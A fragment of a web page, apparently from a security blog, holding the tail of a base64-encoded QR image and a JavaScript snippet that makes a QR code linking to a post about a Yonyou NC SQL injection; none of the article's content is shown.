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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-cpRadarImage-download-pk\_psndoc-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 